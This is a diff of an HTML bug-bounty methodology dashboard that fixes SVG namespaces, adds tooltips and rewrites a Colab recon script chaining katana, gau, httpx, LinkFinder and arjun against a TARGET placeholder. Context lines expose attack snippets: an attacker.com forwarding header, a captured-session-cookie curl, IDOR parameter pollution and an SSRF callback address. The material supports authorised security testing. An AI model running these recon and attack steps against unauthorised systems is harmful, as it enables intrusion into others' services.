@@ -374,7 +374,7 @@
         border: 1px solid var(--border);
         border-radius: 6px;
         padding: 6px 12px;
-        box-shadow: 0 4px 20px rgba(102, 102, 102, 0.5);
+        box-shadow: 0 1px 2rem 1px rgba(102, 102, 102, 0.5);
       }
       [tooltip]::before {
         content: '';
@@ -1779,6 +1779,41 @@
         padding: 7px 14px;
         gap: 8px;
       }
+      /* Target color modification for Python theme */
+      .python-script-icon {
+        --icon-color: #38bdf8; /* Sharp sky blue terminal theme */
+      }
+
+      /* Hover State: Scale up terminal enclosure slightly */
+      .sbanimated-btn:hover .python-script-icon .terminal-box {
+        transform: scale(1.02);
+      }
+
+      /* Hover State: Shift the execution command prompt forward */
+      .sbanimated-btn:hover .python-script-icon .terminal-prompt {
+        transform: translateX(1px);
+      }
+      /* Animation Keyframes: Compiler Engine Loop */
+      @keyframes python-compile-top {
+        0%, 100% {
+          transform: translateY(0) scale(1);
+        }
+        50% {
+          transform: translateY(-1px) translateX(0.5px) scale(1.05);
+          stroke-width: 2px;
+        }
+      }
+
+      @keyframes python-compile-bottom {
+        0%, 100% {
+          transform: translateY(0) scale(1);
+        }
+        50% {
+          transform: translateY(1px) translateX(-0.5px) scale(1.05);
+          stroke-width: 2px;
+        }
+      }
+
     </style>
   </head>
   <body>
@@ -1837,7 +1872,7 @@
             height="16"
             viewBox="0 0 24 24"
             fill="none"
-            xmlns="http://w3.org"
+            xmlns="http://www.w3.org/2000/svg"
           >
             <path
               class="anim-plus"
@@ -1866,7 +1901,7 @@
             height="16"
             viewBox="0 0 24 24"
             fill="none"
-            xmlns="http://w3.org"
+            xmlns="http://www.w3.org/2000/svg"
           >
             <!-- Top layer -->
             <path
@@ -1966,7 +2001,31 @@
             <span class="pnum">14</span>Reporting
           </button>
           <div class="divider-dashed"></div>
-          <button class="pb sbanimated-btn" data-phase="16">
+          <button class="pb sbanimated-btn" data-phase="19" tooltip="Python Tools & Scripts">
+            <svg
+              class="btn-icon python-script-icon"
+              style="--icon-color: #38bdf8"
+              viewBox="0 0 24 24"
+              fill="none"
+              stroke="currentColor"
+              stroke-width="2"
+              stroke-linecap="round"
+              stroke-linejoin="round"
+            >
+              <!-- Terminal frame -->
+              <rect class="terminal-box" x="3" y="3" width="18" height="18" rx="2" />
+
+              <!-- Caret prompt -->
+              <path class="terminal-prompt" d="M6 7l2.5 2.5L6 12" />
+
+              <!-- Code lines -->
+              <line x1="11" y1="8" x2="17" y2="8" stroke-width="1.5"/>
+              <line x1="11" y1="12" x2="15" y2="12" stroke-width="1.5"/>
+              <line x1="6" y1="16" x2="17" y2="16" stroke-width="1.5"/>
+            </svg>
+            PT & S
+          </button>
+          <button class="pb sbanimated-btn" data-phase="16" tooltip="PortSwigger Labs">
             <svg
               class="btn-icon labs-icon"
               style="--icon-color: #f97583"
@@ -1981,10 +2040,10 @@
               <path class="layer-2" d="M2 12l10 5 10-5" />
               <path class="layer-1" d="M2 17l10 5 10-5" />
             </svg>
-            PortSwigger Labs
+            PSL
           </button>
 
-          <button class="pb sbanimated-btn" data-phase="15">
+          <button class="pb sbanimated-btn" data-phase="15" tooltip="File Generator">
             <svg
               class="btn-icon download-icon"
               style="--icon-color: var(--accent2)"
@@ -2002,11 +2061,11 @@
               <polyline class="arrow-head" points="7 10 12 15 17 10" />
               <line class="arrow-shaft" x1="12" y1="15" x2="12" y2="3" />
             </svg>
-            File Generator
+            FG
           </button>
 
           <!-- File Reference -->
-          <button class="pb sbanimated-btn" data-phase="17">
+          <button class="pb sbanimated-btn" data-phase="17" tooltip="File Reference">
             <svg
               class="btn-icon folder-icon"
               style="--icon-color: var(--accent)"
@@ -2023,7 +2082,7 @@
               />
               <line class="folder-line" x1="2" y1="10" x2="22" y2="10" />
             </svg>
-            File Reference
+            FR
           </button>
 
           <button class="pb sbanimated-btn" data-phase="18">
@@ -2174,7 +2233,7 @@
               </div>
               <span class="stg open">
                 <svg
-                  xmlns="http://w3.org"
+                  xmlns="http://www.w3.org/2000/svg"
                   viewBox="0 0 24 24"
                   width="18"
                   height="18"
@@ -2262,7 +2321,7 @@
               <div class="st"><span class="sd"></span>Program Finder Links</div>
               <span class="stg">
                 <svg
-                  xmlns="http://w3.org"
+                  xmlns="http://www.w3.org/2000/svg"
                   viewBox="0 0 24 24"
                   width="18"
                   height="18"
@@ -2408,7 +2467,7 @@
               <!-- GLOBAL -->
               <div class="pf-section">
                 <svg
-                  xmlns="http://w3.org"
+                  xmlns="http://www.w3.org/2000/svg"
                   viewBox="0 0 24 24"
                   width="24"
                   height="24"
@@ -2448,7 +2507,7 @@
                     />
                     <span style="display: none"
                       ><svg
-                        xmlns="http://w3.org"
+                        xmlns="http://www.w3.org/2000/svg"
                         viewBox="0 0 24 24"
                         width="24"
                         height="24"
@@ -2541,7 +2600,7 @@
               <!-- EUROPEAN -->
               <div class="pf-section">
                 <svg
-                  xmlns="http://w3.org"
+                  xmlns="http://www.w3.org/2000/svg"
                   viewBox="0 0 24 24"
                   width="24"
                   height="24"
@@ -2636,7 +2695,7 @@
               <!-- INDIA -->
               <div class="pf-section">
                 <svg
-                  xmlns="http://w3.org"
+                  xmlns="http://www.w3.org/2000/svg"
                   viewBox="0 0 900 600"
                   width="24"
                   height="24"
@@ -2766,7 +2825,7 @@
                     />
                     <span style="display: none">
                       <svg
-                        xmlns="http://w3.org"
+                        xmlns="http://www.w3.org/2000/svg"
                         viewBox="0 0 24 24"
                         width="24"
                         height="24"
@@ -2868,7 +2927,7 @@
               <!-- GOVT / CERT -->
               <div class="pf-section">
                 <svg
-                  xmlns="http://w3.org"
+                  xmlns="http://www.w3.org/2000/svg"
                   viewBox="0 0 24 24"
                   width="24"
                   height="24"
@@ -2957,7 +3016,7 @@
           <div class="ph">
             <div class="pi">
               <svg
-                xmlns="http://w3.org"
+                xmlns="http://www.w3.org/2000/svg"
                 viewBox="0 0 24 24"
                 width="24"
                 height="24"
@@ -3057,7 +3116,7 @@
               <div class="st"><span class="sd"></span>Core Tools</div>
               <span class="stg open"
                 ><svg
-                  xmlns="http://w3.org"
+                  xmlns="http://www.w3.org/2000/svg"
                   viewBox="0 0 24 24"
                   width="18"
                   height="18"
@@ -3116,7 +3175,7 @@ amass enum -passive -d TARGET -o amass.txt
               </div>
               <span class="stg">
                 <svg
-                  xmlns="http://w3.org"
+                  xmlns="http://www.w3.org/2000/svg"
                   viewBox="0 0 24 24"
                   width="18"
                   height="18"
@@ -3177,7 +3236,7 @@ curl -s "https://crt.sh/?q=%.TARGET&amp;output=json" \
               </div>
               <span class="stg">
                 <svg
-                  xmlns="http://w3.org"
+                  xmlns="http://www.w3.org/2000/svg"
                   viewBox="0 0 24 24"
                   width="18"
                   height="18"
@@ -3248,7 +3307,7 @@ curl -s "http://web.archive.org/cdx/search/cdx?url=*.TARGET/*&amp;output=json&am
               </div>
               <span class="stg">
                 <svg
-                  xmlns="http://w3.org"
+                  xmlns="http://www.w3.org/2000/svg"
                   viewBox="0 0 24 24"
                   width="18"
                   height="18"
@@ -3309,7 +3368,7 @@ echo "[*] Total subdomains: $(wc -l &lt; all_subs.txt)"
               <div class="st"><span class="sd"></span>Url's in document</div>
               <span class="stg">
                 <svg
-                  xmlns="http://w3.org"
+                  xmlns="http://www.w3.org/2000/svg"
                   viewBox="0 0 24 24"
                   width="18"
                   height="18"
@@ -3365,7 +3424,7 @@ Array.from(document.querySelectorAll("a")).map(el => el.href);
               <div class="st"><span class="sd"></span>Installing <code>go</code> and run tools (google - collab)</div>
               <span class="stg">
                 <svg
-                  xmlns="http://w3.org"
+                  xmlns="http://www.w3.org/2000/svg"
                   viewBox="0 0 24 24"
                   width="18"
                   height="18"
@@ -3411,34 +3470,45 @@ Array.from(document.querySelectorAll("a")).map(el => el.href);
                   </svg>
                 </button>
                 <pre>
-#  Mount Drive FIRST — Colab can disconnect on idle, and you
-#    don't want a 2-hour crawl living only in the VM's local disk.
-
+# Mount Drive
 from google.colab import drive
 drive.mount('/content/drive')
+import subprocess, os
 WORKDIR = '/content/drive/MyDrive/katana_runs'
-import os
 os.makedirs(WORKDIR, exist_ok=True)
+os.makedirs(f"{WORKDIR}/responses", exist_ok=True)
+print(f"Working directory: {WORKDIR}")
 
-#  Install Go — check go.dev/dl for the current version before
-#    running this; hardcoding a version means this goes stale.
-#    As of writing, 1.26.4 is current; adjust if needed.
-
-!wget -q https://go.dev/dl/go1.26.4.linux-amd64.tar.gz
-!rm -rf /usr/local/go
-!tar -C /usr/local -xzf go1.26.4.linux-amd64.tar.gz
-
+# Install Go
+result = subprocess.run(
+    ['curl', '-s', 'https://go.dev/VERSION?m=text'],
+    capture_output=True, text=True
+)
+GO_VERSION = result.stdout.strip().splitlines()[0]
+print(f"Latest stable Go: {GO_VERSION}")
+os.system(f"wget -q https://go.dev/dl/{GO_VERSION}.linux-amd64.tar.gz")
+os.system("rm -rf /usr/local/go")
+os.system(f"tar -C /usr/local -xzf {GO_VERSION}.linux-amd64.tar.gz")
 os.environ['GOROOT'] = '/usr/local/go'
 os.environ['GOPATH'] = '/root/go'
-os.environ['PATH'] = os.environ['GOROOT'] + '/bin:' + os.environ['GOPATH'] + '/bin:' + os.environ['PATH']
-!go version
+os.environ['PATH']   = (
+    '/usr/local/go/bin'
+    + ':/root/go/bin'
+    + ':' + os.environ['PATH']
+)
+os.system("go version")
+
+%env WORKDIR=/content/drive/MyDrive/katana_runs
 
 #  Install katana + uro (uro cleans the output — non-negotiable
+os.system("go install github.com/projectdiscovery/katana/cmd/katana@latest")
+os.system("go install github.com/projectdiscovery/httpx/cmd/httpx@latest")
+os.system("pip install -q uro")
 
-!go install github.com/projectdiscovery/katana/cmd/katana@latest > /dev/null 2>&1
-!pip install -q uro > /dev/null 2>&1
-
-#  Sanity checks before the real run
+# Verify all three are reachable
+os.system("katana -version")
+os.system("~/go/bin/httpx -version")
+os.system("uro --version")
 
 !free -h          # check RAM headroom before deciding on -jsl
 !~/go/bin/katana -health-check
@@ -3447,43 +3517,212 @@ os.environ['PATH'] = os.environ['GOROOT'] + '/bin:' + os.environ['GOPATH'] + '/b
 # a flagged cloud IP — run this against ONE known-live URL first.
 !~/go/bin/katana -u https://TARGET -d 1 -silent | head -5
 
-# The actual crawl
-#    Changes from before:
-#    - added -xhr and -fx (catches endpoint classes -jc alone misses)
-#    - -sr + -srd saves raw responses so you can verify you're getting
-#      real content, not soft-blocked junk, without re-crawling
-#    - -rl kept conservative; check the program's stated rate limit
-#      and don't exceed it — you're on a shared cloud IP range
-#    - output goes to Drive, not local disk
-#    - dropped -jsl unless `free -h` above showed enough headroom;
-#      add it back only if memory allows
+# ============================================================
+# Extract domains from live_subs.txt -> domains.txt
+from urllib.parse import urlparse
+INPUT   = f"live_subs.txt"
+OUTPUT  = f"{WORKDIR}/domains.txt"
+
+domains = set()
+
+with open(INPUT, 'r') as f:
+    for line in f:
+        line = line.strip()
+        if not line:
+            continue
+
+        # Handle lines that already are bare hostnames (no scheme)
+        if not line.startswith('http://') and not line.startswith('https://'):
+            line = 'https://' + line
+
+        try:
+            host = urlparse(line).hostname
+            if host:
+                domains.add(host.lower())
+        except Exception:
+            continue
+
+with open(OUTPUT, 'w') as f:
+    for d in sorted(domains):
+        f.write(d + '\n')
+
+print(f"Unique domains extracted : {len(domains)}")
+print(f"Saved to                 : {OUTPUT}")
+print("\nSample (first 20):")
+for d in sorted(domains)[:20]:
+    print(f"  {d}")
+
+
+# ============================================================
+# Passive URL collection (zero requests to target)
+#   Run this BEFORE active crawling. Wayback + gau surface
+#   endpoints that katana will never find in a single crawl.
+#   Install waybackurls and gau
+os.system("go install github.com/tomnomnom/waybackurls@latest")
+os.system("go install github.com/lc/gau/v2/cmd/gau@latest")
+
+# Create default gau config and re-run
+GAU_CONFIG = "/root/.gau.toml"
+
+config_content = """
+[providers]
+  wayback   = true
+  commoncrawl = true
+  otx       = true
+  urlscan   = true
+
+[filters]
+  blacklist = ["png","jpg","jpeg","gif","svg","ico","woff","woff2","ttf","eot","mp4","webm","css"]
+
+[workers]
+  workers = 1
+"""
+with open(GAU_CONFIG, 'w') as f:
+    f.write(config_content.strip())
+print(f"Config written to: {GAU_CONFIG}")
+os.system(f"cat {GAU_CONFIG}")
+
+# Feed domains only (no scheme), one per line
+# Assumes you have a domains.txt extracted from live_subs.txt
+!cat "$WORKDIR/domains.txt" | ~/go/bin/waybackurls > "$WORKDIR/passive_wayback.txt"
+!cat "$WORKDIR/domains.txt" | ~/go/bin/gau --subs    > "$WORKDIR/passive_gau.txt"
+
+# Merge and deduplicate passive results immediately
+!cat "$WORKDIR/passive_wayback.txt" "$WORKDIR/passive_gau.txt" \
+  | uro -o "$WORKDIR/passive_filtered.txt"
+
+print("Passive URLs after dedup:", end=" ")
+!wc -l "$WORKDIR/passive_filtered.txt"
+
+# ============================================================
+# Active crawl with katana
+#   Flag rationale:
+#   -jc          parse and execute JavaScript (finds API calls,
+#                dynamic routes)
+#   -kf all      include known-file paths from katana's wordlist
+#   -xhr         capture XHR/fetch requests made by JS
+#   -fx          extract endpoints from JS source files directly
+#   -d 5         crawl depth; reduce to 3 if crawl runs >90 min
+#   -c 5         concurrency; conservative for shared cloud IP
+#   -rl 10       rate limit requests/sec; check program scope
+#                rules before increasing
+#   -ef          skip static assets that add noise and cost time
+#   -jsonl       structured output — lets you extract fields
+#                with jq later without re-crawling
+#   -silent      suppress progress noise to stdout
+#
+#   NOT used here:
+#   -jsl         headless JS (uses full browser); only add if
+#                `free -h` above shows >4 GB free AND you need
+#                it for a specific SPA target
+#   -sr/-srd     raw response saving; useful for spot checks
+#                but will exhaust Drive quota on large crawls.
+#                Use selectively on a subset if needed.
 
 !~/go/bin/katana \
-  -u live_subs.txt \
+  -list live_subs.txt \
   -jc -kf all -xhr -fx \
   -d 5 \
-  -ef "woff,css,png,jpg,woff2,jpeg,gif,svg,ico,mp4,webm" \
+  -c 5 \
   -rl 10 \
-  -sr -srd "{WORKDIR}/responses" \
-  -o "{WORKDIR}/endpoints_raw.txt" \
-  -jsonl  > /dev/null 2>&1
+  -ef "woff,css,png,jpg,woff2,jpeg,gif,svg,ico,mp4,webm,ttf,eot" \
+  -o "$WORKDIR/endpoints_raw.txt" \
+  -jsonl \
+  -silent > /dev/null 2>&1
 
-#  Clean the output immediately — don't let raw output sit
-#    unfiltered like last time
+print("Raw endpoints collected:", end=" ")
+!wc -l "$WORKDIR/endpoints_raw.txt"
 
-!cat "{WORKDIR}/endpoints_raw.txt" | jq -r '.endpoint // .url // empty' > "{WORKDIR}/urls_only.txt"
-!cat "{WORKDIR}/urls_only.txt" | uro -o "{WORKDIR}/filtered.txt" > /dev/null 2>&1
+# ============================================================
+# Parse and clean active crawl output
+#   The -jsonl flag means each line is a JSON object.
+#   katana's JSONL schema uses the key "endpoint" for the URL.
+#   jq extracts it; uro deduplicates and normalizes.
 
-print("Raw lines:", end=" ")
-!wc -l "{WORKDIR}/urls_only.txt"
-print("Filtered lines:", end=" ")
-!wc -l "{WORKDIR}/filtered.txt"
+# Extract URLs from JSONL — handles both schema variants
+!cat "$WORKDIR/endpoints_raw.txt" \
+  | jq -r '.endpoint // .request.endpoint // .url // empty' 2>/dev/null \
+  > "$WORKDIR/urls_only.txt"
 
-#  Quick spot-check: are responses actually varied, or are you
-#    getting blocked/cloaked content from the cloud IP?
+# Merge with passive results before dedup pass
+!cat "$WORKDIR/urls_only.txt" "$WORKDIR/passive_filtered.txt" \
+  > "$WORKDIR/urls_combined.txt"
 
-!pip install -q httpx[cli] 2>/dev/null || go install github.com/projectdiscovery/httpx/cmd/httpx@latest > /dev/null 2>&1
-!cat "{WORKDIR}/filtered.txt" | ~/go/bin/httpx -sc -cl -title -silent | head -30 > /dev/null 2>&1
+# Deduplicate and normalize with uro
+!uro -i "$WORKDIR/urls_combined.txt" -o "$WORKDIR/filtered.txt"
+
+print("Active raw:   ", end=""); !wc -l "$WORKDIR/urls_only.txt"
+print("Combined:     ", end=""); !wc -l "$WORKDIR/urls_combined.txt"
+print("After uro:    ", end=""); !wc -l "$WORKDIR/filtered.txt"
+
+# ============================================================
+# Live probe with httpx
+#   -sc   show status code
+#   -cl   show content length (helps spot uniform blocked resp)
+#   -title  extract page title
+#   -mc   only show these status codes — reduces noise
+#   -td   show response content type
+#   -silent suppress banners
+#
+#   Output saved to Drive for later grep/analysis.
+#   Do NOT redirect to /dev/null — you need this output.
+
+!cat "$WORKDIR/filtered.txt" \
+  | ~/go/bin/httpx \
+    -sc \
+    -cl \
+    -title \
+    -td \
+    -mc 200,301,302,403,401,405,500 \
+    -silent \
+  | tee "$WORKDIR/live_endpoints.txt" \
+  | head -50
+
+print("\nTotal live endpoints:", end=" ")
+!wc -l "$WORKDIR/live_endpoints.txt"
+
+# ============================================================
+# JavaScript endpoint extraction (separate pass)
+#   katana -fx covers basic JS parsing but misses obfuscated
+#   or lazy-loaded scripts. getJS + LinkFinder covers this gap.
+#   This is where auth tokens, hidden API routes, and internal
+#   service URLs appear — high value for IDOR and auth bugs.
+os.system("pip install -q linkfinder")
+os.system("go install github.com/003random/getJS@latest")
+
+# Pull all JS file URLs from your filtered list
+!grep -iE '\.js(\?|$)' "$WORKDIR/filtered.txt" > "$WORKDIR/js_files.txt"
+
+print("JS files found:", end=" ")
+!wc -l "$WORKDIR/js_files.txt"
+
+# Fetch each JS file and extract endpoints from source
+!cat "$WORKDIR/js_files.txt" \
+  | ~/go/bin/getJS --complete 2>/dev/null \
+  | python3 -m linkfinder -i - -o cli 2>/dev/null \
+  | uro \
+  | tee "$WORKDIR/js_endpoints.txt" \
+  | head -30
+
+print("\nEndpoints from JS:", end=" ")
+!wc -l "$WORKDIR/js_endpoints.txt"
+
+# ============================================================
+# Parameter discovery
+#   Run arjun against filtered endpoints to find hidden params.
+#   Hidden parameters are the primary attack surface for IDOR,
+#   mass assignment, and auth bypass bugs.
+#   -t 10  threads; keep low to avoid rate limiting
+#   -oJ    JSON output for structured triage
+os.system("pip install -q arjun")
+
+!python3 -m arjun \
+  -i "$WORKDIR/filtered.txt" \
+  -t 10 \
+  -oJ "$WORKDIR/arjun_params.json" \
+  2>/dev/null
+
+print("Arjun output saved to $WORKDIR/arjun_params.json")
 
 </pre>
               </div>
@@ -3591,7 +3830,7 @@ print("Filtered lines:", end=" ")
               <div class="st"><span class="sd"></span>httpx Live Probe</div>
               <span class="stg open">
                 <svg
-                  xmlns="http://w3.org"
+                  xmlns="http://www.w3.org/2000/svg"
                   viewBox="0 0 24 24"
                   width="18"
                   height="18"
@@ -3659,7 +3898,7 @@ grep -Ei "java"  httpx_output.txt | awk '{print $1}' &gt; tech_java.txt
               </div>
               <span class="stg">
                 <svg
-                  xmlns="http://w3.org"
+                  xmlns="http://www.w3.org/2000/svg"
                   viewBox="0 0 24 24"
                   width="18"
                   height="18"
@@ -3729,7 +3968,7 @@ comm -23 &lt;(sort live_subs.txt) &lt;(sort behind_waf.txt) &gt; no_waf_subs.txt
               </div>
               <span class="stg">
                 <svg
-                  xmlns="http://w3.org"
+                  xmlns="http://www.w3.org/2000/svg"
                   viewBox="0 0 24 24"
                   width="18"
                   height="18"
@@ -3796,7 +4035,7 @@ nmap -sV -sC -p $ports -iL clean_hosts.txt -oN nmap_scan.txt
           <div class="ph">
             <div class="pi">
               <svg
-                xmlns="http://w3.org"
+                xmlns="http://www.w3.org/2000/svg"
                 viewBox="0 0 24 24"
                 width="24"
                 height="24"
@@ -3905,7 +4144,7 @@ nmap -sV -sC -p $ports -iL clean_hosts.txt -oN nmap_scan.txt
               <div class="st"><span class="sd"></span>Screenshot Commands</div>
               <span class="stg open">
                 <svg
-                  xmlns="http://w3.org"
+                  xmlns="http://www.w3.org/2000/svg"
                   viewBox="0 0 24 24"
                   width="18"
                   height="18"
@@ -3965,7 +4204,7 @@ eyewitness --web -f live_subs.txt --threads 5 -d screenshots/
               </div>
               <span class="stg">
                 <svg
-                  xmlns="http://w3.org"
+                  xmlns="http://www.w3.org/2000/svg"
                   viewBox="0 0 24 24"
                   width="18"
                   height="18"
@@ -4026,7 +4265,7 @@ eyewitness --web -f live_subs.txt --threads 5 -d screenshots/
           <div class="ph">
             <div class="pi">
               <svg
-                xmlns="http://w3.org"
+                xmlns="http://www.w3.org/2000/svg"
                 viewBox="0 0 24 24"
                 width="24"
                 height="24"
@@ -4159,7 +4398,7 @@ eyewitness --web -f live_subs.txt --threads 5 -d screenshots/
               </div>
               <span class="stg open">
                 <svg
-                  xmlns="http://w3.org"
+                  xmlns="http://www.w3.org/2000/svg"
                   viewBox="0 0 24 24"
                   width="18"
                   height="18"
@@ -4223,7 +4462,7 @@ eyewitness --web -f live_subs.txt --threads 5 -d screenshots/
               </div>
               <span class="stg">
                 <svg
-                  xmlns="http://w3.org"
+                  xmlns="http://www.w3.org/2000/svg"
                   viewBox="0 0 24 24"
                   width="18"
                   height="18"
@@ -4301,7 +4540,7 @@ eyewitness --web -f live_subs.txt --threads 5 -d screenshots/
           <div class="ph">
             <div class="pi">
               <svg
-                xmlns="http://w3.org"
+                xmlns="http://www.w3.org/2000/svg"
                 viewBox="0 0 24 24"
                 width="24"
                 height="24"
@@ -4419,7 +4658,7 @@ eyewitness --web -f live_subs.txt --threads 5 -d screenshots/
               </div>
               <span class="stg open">
                 <svg
-                  xmlns="http://w3.org"
+                  xmlns="http://www.w3.org/2000/svg"
                   viewBox="0 0 24 24"
                   width="18"
                   height="18"
@@ -4509,7 +4748,7 @@ X-Forwarded-Server: attacker.com
               <div class="st"><span class="sd"></span>Session Management</div>
               <span class="stg">
                 <svg
-                  xmlns="http://w3.org"
+                  xmlns="http://www.w3.org/2000/svg"
                   viewBox="0 0 24 24"
                   width="18"
                   height="18"
@@ -4589,7 +4828,7 @@ curl -H "Cookie: session=CAPTURED_TOKEN" \
               <div class="st"><span class="sd"></span>OAuth / SSO Testing</div>
               <span class="stg">
                 <svg
-                  xmlns="http://w3.org"
+                  xmlns="http://www.w3.org/2000/svg"
                   viewBox="0 0 24 24"
                   width="18"
                   height="18"
@@ -4640,7 +4879,7 @@ curl -H "Cookie: session=CAPTURED_TOKEN" \
           <div class="ph">
             <div class="pi">
               <svg
-                xmlns="http://w3.org"
+                xmlns="http://www.w3.org/2000/svg"
                 viewBox="0 0 24 24"
                 width="24"
                 height="24"
@@ -4773,7 +5012,7 @@ curl -H "Cookie: session=CAPTURED_TOKEN" \
               <div class="st"><span class="sd"></span>Basic IDOR Tests</div>
               <span class="stg open">
                 <svg
-                  xmlns="http://w3.org"
+                  xmlns="http://www.w3.org/2000/svg"
                   viewBox="0 0 24 24"
                   width="18"
                   height="18"
@@ -4841,7 +5080,7 @@ done
               <div class="st"><span class="sd"></span>Parameter Pollution</div>
               <span class="stg">
                 <svg
-                  xmlns="http://w3.org"
+                  xmlns="http://www.w3.org/2000/svg"
                   viewBox="0 0 24 24"
                   width="18"
                   height="18"
@@ -4899,7 +5138,7 @@ curl "https://TARGET/api/profile?user_id=VICTIM_ID&amp;user_id=YOUR_ID"
               <div class="st"><span class="sd"></span>IDOR Hunt Checklist</div>
               <span class="stg">
                 <svg
-                  xmlns="http://w3.org"
+                  xmlns="http://www.w3.org/2000/svg"
                   viewBox="0 0 24 24"
                   width="18"
                   height="18"
@@ -4978,7 +5217,7 @@ curl "https://TARGET/api/profile?user_id=VICTIM_ID&amp;user_id=YOUR_ID"
           <div class="ph">
             <div class="pi">
               <svg
-                xmlns="http://w3.org"
+                xmlns="http://www.w3.org/2000/svg"
                 viewBox="0 0 24 24"
                 width="24"
                 height="24"
@@ -5061,7 +5300,7 @@ curl "https://TARGET/api/profile?user_id=VICTIM_ID&amp;user_id=YOUR_ID"
               </div>
               <span class="stg open">
                 <svg
-                  xmlns="http://w3.org"
+                  xmlns="http://www.w3.org/2000/svg"
                   viewBox="0 0 24 24"
                   width="18"
                   height="18"
@@ -5121,7 +5360,7 @@ curl "https://TARGET/api/profile?user_id=VICTIM_ID&amp;user_id=YOUR_ID"
               </div>
               <span class="stg">
                 <svg
-                  xmlns="http://w3.org"
+                  xmlns="http://www.w3.org/2000/svg"
                   viewBox="0 0 24 24"
                   width="18"
                   height="18"
@@ -5197,7 +5436,7 @@ curl "https://TARGET/api/profile?user_id=VICTIM_ID&amp;user_id=YOUR_ID"
               </div>
               <span class="stg">
                 <svg
-                  xmlns="http://w3.org"
+                  xmlns="http://www.w3.org/2000/svg"
                   viewBox="0 0 24 24"
                   width="18"
                   height="18"
@@ -5267,7 +5506,7 @@ dalfox file candidates_xss.txt --silence
           <div class="ph">
             <div class="pi">
               <svg
-                xmlns="http://w3.org"
+                xmlns="http://www.w3.org/2000/svg"
                 viewBox="0 0 24 24"
                 width="24"
                 height="24"
@@ -5392,7 +5631,7 @@ dalfox file candidates_xss.txt --silence
               </div>
               <span class="stg open">
                 <svg
-                  xmlns="http://w3.org"
+                  xmlns="http://www.w3.org/2000/svg"
                   viewBox="0 0 24 24"
                   width="18"
                   height="18"
@@ -5462,7 +5701,7 @@ done | tee secrets_found.txt
               </div>
               <span class="stg">
                 <svg
-                  xmlns="http://w3.org"
+                  xmlns="http://www.w3.org/2000/svg"
                   viewBox="0 0 24 24"
                   width="18"
                   height="18"
@@ -5529,7 +5768,7 @@ echo "[*] High-value files: $(wc -l &lt; high_value_files.txt)"
               </div>
               <span class="stg">
                 <svg
-                  xmlns="http://w3.org"
+                  xmlns="http://www.w3.org/2000/svg"
                   viewBox="0 0 24 24"
                   width="18"
                   height="18"
@@ -5591,7 +5830,7 @@ done | tee js_manual_review.txt
           <div class="ph">
             <div class="pi">
               <svg
-                xmlns="http://w3.org"
+                xmlns="http://www.w3.org/2000/svg"
                 viewBox="0 0 24 24"
                 width="24"
                 height="24"
@@ -5699,7 +5938,7 @@ done | tee js_manual_review.txt
               </div>
               <span class="stg open">
                 <svg
-                  xmlns="http://w3.org"
+                  xmlns="http://www.w3.org/2000/svg"
                   viewBox="0 0 24 24"
                   width="18"
                   height="18"
@@ -5761,7 +6000,7 @@ arjun -i live_subs.txt -m GET,POST -t 10 -o arjun_params.txt
               </div>
               <span class="stg">
                 <svg
-                  xmlns="http://w3.org"
+                  xmlns="http://www.w3.org/2000/svg"
                   viewBox="0 0 24 24"
                   width="18"
                   height="18"
@@ -5829,7 +6068,7 @@ echo "[*] Redirect: $(wc -l &lt; candidates_redirect.txt)"
           <div class="ph">
             <div class="pi">
               <svg
-                xmlns="http://w3.org"
+                xmlns="http://www.w3.org/2000/svg"
                 viewBox="0 0 24 24"
                 width="24"
                 height="24"
@@ -5972,7 +6211,7 @@ echo "[*] Redirect: $(wc -l &lt; candidates_redirect.txt)"
               </div>
               <span class="stg open">
                 <svg
-                  xmlns="http://w3.org"
+                  xmlns="http://www.w3.org/2000/svg"
                   viewBox="0 0 24 24"
                   width="18"
                   height="18"
@@ -6020,7 +6259,7 @@ echo "[*] Redirect: $(wc -l &lt; candidates_redirect.txt)"
               </div>
               <span class="stg">
                 <svg
-                  xmlns="http://w3.org"
+                  xmlns="http://www.w3.org/2000/svg"
                   viewBox="0 0 24 24"
                   width="18"
                   height="18"
@@ -6092,7 +6331,7 @@ def handleResponse(req, interesting):
               </div>
               <span class="stg">
                 <svg
-                  xmlns="http://w3.org"
+                  xmlns="http://www.w3.org/2000/svg"
                   viewBox="0 0 24 24"
                   width="18"
                   height="18"
@@ -6157,7 +6396,7 @@ done
               </div>
               <span class="stg">
                 <svg
-                  xmlns="http://w3.org"
+                  xmlns="http://www.w3.org/2000/svg"
                   viewBox="0 0 24 24"
                   width="18"
                   height="18"
@@ -6328,7 +6567,7 @@ attacker+ssrf@YOUR-ID.oast.fun    (some mail servers do DNS lookup)
               </div>
               <span class="stg">
                 <svg
-                  xmlns="http://w3.org"
+                  xmlns="http://www.w3.org/2000/svg"
                   viewBox="0 0 24 24"
                   width="18"
                   height="18"
@@ -6398,7 +6637,7 @@ curl -i -H "X-Rewrite-URL: ${PATH}" "https://TARGET/"
               </div>
               <span class="stg">
                 <svg
-                  xmlns="http://w3.org"
+                  xmlns="http://www.w3.org/2000/svg"
                   viewBox="0 0 24 24"
                   width="18"
                   height="18"
@@ -6456,7 +6695,7 @@ curl -i -H "X-Rewrite-URL: ${PATH}" "https://TARGET/"
           <div class="ph">
             <div class="pi">
               <svg
-                xmlns="http://w3.org"
+                xmlns="http://www.w3.org/2000/svg"
                 viewBox="0 0 24 24"
                 width="24"
                 height="24"
@@ -6599,7 +6838,7 @@ curl -i -H "X-Rewrite-URL: ${PATH}" "https://TARGET/"
               <div class="st"><span class="sd"></span>ffuf Fuzzing</div>
               <span class="stg open">
                 <svg
-                  xmlns="http://w3.org"
+                  xmlns="http://www.w3.org/2000/svg"
                   viewBox="0 0 24 24"
                   width="18"
                   height="18"
@@ -6672,7 +6911,7 @@ ffuf -u "https://TARGET/api/FUZZ" \
               </div>
               <span class="stg">
                 <svg
-                  xmlns="http://w3.org"
+                  xmlns="http://www.w3.org/2000/svg"
                   viewBox="0 0 24 24"
                   width="18"
                   height="18"
@@ -6737,7 +6976,7 @@ cat candidates_redirect.txt \
           <div class="ph">
             <div class="pi">
               <svg
-                xmlns="http://w3.org"
+                xmlns="http://www.w3.org/2000/svg"
                 viewBox="0 0 24 24"
                 width="24"
                 height="24"
@@ -6872,7 +7111,7 @@ cat candidates_redirect.txt \
               </div>
               <span class="stg open">
                 <svg
-                  xmlns="http://w3.org"
+                  xmlns="http://www.w3.org/2000/svg"
                   viewBox="0 0 24 24"
                   width="18"
                   height="18"
@@ -6946,7 +7185,7 @@ python3 corsy.py -i live_subs.txt -t 10 \
           <div class="ph">
             <div class="pi">
               <svg
-                xmlns="http://w3.org"
+                xmlns="http://www.w3.org/2000/svg"
                 viewBox="0 0 24 24"
                 width="24"
